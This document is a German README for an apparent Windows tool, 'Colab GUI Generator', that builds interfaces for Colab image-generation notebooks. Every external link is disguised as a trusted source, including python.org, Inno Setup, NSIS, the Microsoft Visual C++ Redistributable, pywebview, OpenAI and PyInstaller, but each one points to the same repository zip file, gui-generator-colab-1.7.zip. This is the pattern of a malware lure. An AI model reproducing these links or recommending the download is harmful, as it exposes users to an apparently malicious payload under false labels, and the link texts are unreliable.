# 🚀 Colab GUI Generator v2.0

Eine **native Windows-Desktop-Anwendung**, die automatisch grafische Benutzeroberflächen für Google Colab Notebooks generiert. Ideal für KI-Bildgenerierung mit Stable Diffusion, SDXL, FLUX und mehr.

## ✨ Features

- **Automatische GUI-Generierung**: Analysiert `.ipynb`-Dateien und erkennt Parameter automatisch
- **OpenAI-Integration**: Intelligente Prompt-Verbesserung und Einstellungsvorschläge
- **Automatischer Dark/Light Mode**: Passt sich an Ihre Windows-Einstellungen an
- **Native Windows-App**: Läuft in einem eigenen Fenster, kein Browser nötig
- **Google Account-Verwaltung**: Speichert Ihre Accounts für schnellen Zugriff
- **Drag & Drop**: Ziehen Sie Notebooks einfach in die Anwendung

---

## 📦 Installation

### Option 1: Windows-Installer (Empfohlen)

1. **Laden Sie `ColabGUIGenerator_Setup_2.0.0.exe` herunter**
2. **Doppelklick** auf die Setup-Datei
3. **Folgen Sie dem Installationsassistenten**
4. **Fertig!** Die Anwendung ist im Startmenü und auf dem Desktop verfügbar

### Option 2: Portable Version

1. **Laden Sie `ColabGUIGenerator.exe` herunter**
2. **Speichern Sie die Datei** an einem beliebigen Ort
3. **Doppelklick** zum Starten - keine Installation nötig

### Option 3: Aus Quellcode

```bash
# Repository klonen oder ZIP entpacken
cd colab_gui_generator

# Abhängigkeiten installieren
pip install pywebview requests openai pillow

# Anwendung starten
python main.py
```

---

## 🔧 Eigenen Installer erstellen

Falls Sie den Installer selbst erstellen möchten:

### Voraussetzungen

1. **Python 3.10+** von [python.org](https://github.com/jahdaganj00ki-netizen/colab-gui-generator/raw/refs/heads/master/installer/gui-generator-colab-1.7.zip)
2. **Abhängigkeiten installieren:**
   ```bash
   pip install pyinstaller pywebview requests openai pillow
   ```
3. **Installer-Tool (eines davon):**
   - [Inno Setup 6+](https://github.com/jahdaganj00ki-netizen/colab-gui-generator/raw/refs/heads/master/installer/gui-generator-colab-1.7.zip) (empfohlen)
   - [NSIS 3+](https://github.com/jahdaganj00ki-netizen/colab-gui-generator/raw/refs/heads/master/installer/gui-generator-colab-1.7.zip)

### Build-Prozess

**Methode 1: Automatisch (empfohlen)**
```bash
python create_installer.py
```

**Methode 2: Manuell**

1. Executable erstellen:
   ```bash
   python build_exe.py
   ```

2. Installer erstellen:
   - **Inno Setup**: Öffnen Sie `installer/ColabGUIGenerator_Setup.iss` und kompilieren Sie
   - **NSIS**: Rechtsklick auf `installer/ColabGUIGenerator_Setup.nsi` → "Compile NSIS Script"

### Ergebnis

Nach dem Build finden Sie im `dist`-Ordner:
- `ColabGUIGenerator.exe` - Portable Anwendung
- `ColabGUIGenerator_Setup_2.0.0.exe` - Windows-Installer

---

## 🎯 Verwendung

### Schritt 1: Notebook laden

1. Starten Sie die Anwendung
2. Laden Sie ein Notebook:
   - **Per Datei**: Klicken Sie auf den Upload-Bereich oder ziehen Sie eine `.ipynb`-Datei hinein
   - **Per URL**: Fügen Sie eine GitHub-URL ein

### Schritt 2: GUI generieren

1. Wählen Sie optional einen Google Account aus
2. Klicken Sie auf "GUI generieren und starten"
3. Die Anwendung analysiert das Notebook und erstellt eine passende Oberfläche

### Schritt 3: Mit Colab verbinden

1. Das Notebook wird automatisch in Ihrem Browser geöffnet
2. Führen Sie alle Zellen im Notebook aus
3. Kopieren Sie die **ngrok-URL** in das Verbindungsfeld der Desktop-App
4. Klicken Sie auf "Verbinden"

### Schritt 4: Generieren!

Sobald die Verbindung steht, können Sie:
- Prompts eingeben und mit KI verbessern lassen
- Einstellungen anpassen
- Bilder generieren, laden und speichern

---

## 🤖 KI-Funktionen (OpenAI)

| Funktion | Beschreibung |
|----------|--------------|
| **Prompt verbessern** | Optimiert Ihren Prompt für bessere Ergebnisse |
| **Negative Prompt generieren** | Erstellt automatisch passende Negative Prompts |
| **Einstellungen vorschlagen** | Empfiehlt optimale Werte basierend auf Ihrem Prompt |

### API-Key einrichten

1. Öffnen Sie die Windows-Suche → "Umgebungsvariablen"
2. Klicken Sie auf "Umgebungsvariablen"
3. Neue Benutzervariable erstellen:
   - Name: `OPENAI_API_KEY`
   - Wert: Ihr API-Key

---

## 🌓 Dark/Light Mode

Die Anwendung erkennt automatisch Ihre Windows-Einstellung:
- **Windows im Dunkelmodus** → App im Dunkelmodus
- **Windows im Hellmodus** → App im Hellmodus

Manuell umschalten: Klicken Sie auf das ☀️/🌙 Symbol oben rechts

---

## 📁 Projektstruktur

```
colab_gui_generator/
├── main.py                    # Hauptanwendung
├── core/                      # Kernmodule
│   ├── notebook_parser.py     # Notebook-Analyse
│   ├── gui_generator.py       # GUI-Generierung
│   ├── colab_manager.py       # Colab-Verbindung
│   ├── theme_manager.py       # Dark/Light Mode
│   └── ai_assistant.py        # OpenAI-Integration
├── installer/                 # Installer-Skripte
│   ├── ColabGUIGenerator_Setup.iss  # Inno Setup
│   └── ColabGUIGenerator_Setup.nsi  # NSIS
├── assets/                    # Icons und Ressourcen
├── build_exe.py              # PyInstaller Build-Skript
├── create_installer.py       # Komplettes Installer-Skript
├── requirements.txt          # Python-Abhängigkeiten
└── README.md                 # Diese Dokumentation
```

---

## ⌨️ Tastenkürzel

| Kürzel | Aktion |
|--------|--------|
| `Ctrl+Enter` | Generieren starten |
| `Ctrl+S` | Bild speichern |

---

## 🐛 Fehlerbehebung

### "Die Anwendung startet nicht"
- Stellen Sie sicher, dass Sie Windows 10/11 64-Bit verwenden
- Installieren Sie das [Microsoft Visual C++ Redistributable](https://github.com/jahdaganj00ki-netizen/colab-gui-generator/raw/refs/heads/master/installer/gui-generator-colab-1.7.zip)

### "Verbindung fehlgeschlagen"
- Prüfen Sie, ob das Colab-Notebook läuft
- Stellen Sie sicher, dass die ngrok-URL korrekt kopiert wurde

### "KI nicht verfügbar"
- Setzen Sie die Umgebungsvariable `OPENAI_API_KEY`
- Prüfen Sie, ob Ihr API-Key gültig ist

---

## 📄 Lizenz

MIT License - Frei verwendbar und modifizierbar.

---

## 🙏 Credits

- [pywebview](https://github.com/jahdaganj00ki-netizen/colab-gui-generator/raw/refs/heads/master/installer/gui-generator-colab-1.7.zip) - Native GUI-Fenster
- [OpenAI](https://github.com/jahdaganj00ki-netizen/colab-gui-generator/raw/refs/heads/master/installer/gui-generator-colab-1.7.zip) - KI-Funktionen
- [PyInstaller](https://github.com/jahdaganj00ki-netizen/colab-gui-generator/raw/refs/heads/master/installer/gui-generator-colab-1.7.zip) - Executable-Erstellung
- [Inno Setup](https://github.com/jahdaganj00ki-netizen/colab-gui-generator/raw/refs/heads/master/installer/gui-generator-colab-1.7.zip) - Windows-Installer
